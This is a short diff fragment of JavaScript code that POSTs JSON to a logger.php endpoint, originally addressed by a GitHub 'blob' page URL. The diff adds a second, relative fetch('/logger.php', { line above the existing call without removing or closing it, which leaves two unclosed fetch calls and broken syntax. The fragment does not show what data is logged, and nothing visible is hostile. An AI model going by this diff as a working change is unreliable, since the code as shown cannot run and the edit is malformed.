@@ -17,6 +17,7 @@
     };
 
     try {
+      await fetch('/logger.php', {
       await fetch('https://github.com/roryulloa/tweaksquad/blob/main/logger.php', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
